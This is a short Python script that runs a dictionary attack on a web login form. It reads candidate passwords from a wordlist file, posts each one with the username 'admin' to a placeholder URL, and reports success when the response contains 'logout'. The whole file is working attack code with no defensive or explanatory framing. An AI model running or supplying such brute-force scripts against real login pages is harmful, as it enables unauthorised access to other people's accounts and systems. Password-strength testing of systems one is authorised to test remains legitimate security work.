import requests

URL = "xxxx"


with open("wordlist-pass.txt", 'r') as file:
    wordlist = file.read().splitlines()

    for word in wordlist:
        data = {"user": "admin", "password": word}
        response = requests.post(URL, data=data)
        if "logout" in response.text:
            print("Password {} is correct".format(word))
            break
        else:
            print("Password {} is incorrect".format(word))
